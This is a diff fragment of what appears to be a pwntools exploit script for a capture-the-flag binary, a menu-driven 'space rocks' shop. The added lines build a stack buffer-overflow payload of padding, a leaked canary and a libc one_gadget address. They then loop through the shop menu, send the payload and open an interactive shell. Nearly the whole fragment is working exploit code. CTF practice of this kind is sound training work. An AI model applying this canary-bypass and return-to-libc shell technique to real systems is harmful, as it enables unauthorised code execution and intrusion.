@@ -65,5 +65,21 @@ constraints:
   [rsp+0x70] == NULL
 
 '''
+one_gadget = libc_base + 0x4f365
+offset = 24
+payload = offset*'A'
+payload += p64(canary)
+payload += 8*'A'
+payload += p64(one_gadget)
 
+for i in range(7):
+	io.recvuntil('2. Space food')
+	io.sendline(b'1')
+	io.recvuntil('3. Deathstar(70.00 s.rocks)')
+	io.sendline(b'2')
+	io.recvuntil('Red or Green Kryptonite?')
+	io.sendline(b'1')
+io.recvuntil('You have less than 20 space rocks! Are you sure you want to buy it?')
+io.sendline(payload.encode())
+io.interactive()
 
